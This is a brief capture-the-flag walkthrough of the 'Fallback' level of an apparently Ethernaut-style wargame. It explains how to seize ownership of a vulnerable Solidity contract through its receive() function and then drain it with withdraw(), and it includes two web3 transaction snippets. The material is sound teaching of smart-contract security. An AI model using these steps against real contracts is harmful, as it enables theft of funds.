# Level 1: Fallback

## Level objectives:
1. Claim ownership of contract.
2. Drain contract.

## Steps:
- To claim ownership, I can either send eth to the `contribute()` function until I surpass 1000 * 1 Ether, or send eth to the contract's fallback function, triggering the faulty `receive()` function that sets `owner = msg.sender`.
- To send eth to the fallback function, `contribution[msg.sender] > 0`.
- So I first send minimal eth to the `contribute()` function, to get my name in the hat.
```sol
contract.contribute.sendTransaction({   
  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
  value: web3.utils.toWei('0.0000001', 'ether')
});
```
- Then send eth to the fallback function to claim ownership.
```sol
contract.sendTransaction({   
  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
  value: web3.utils.toWei('0.0000001', 'ether')
});
```
- Verified by calling `contract.owner()`.
- Now  I call the `withdraw()` function to take all the eth in the contract.
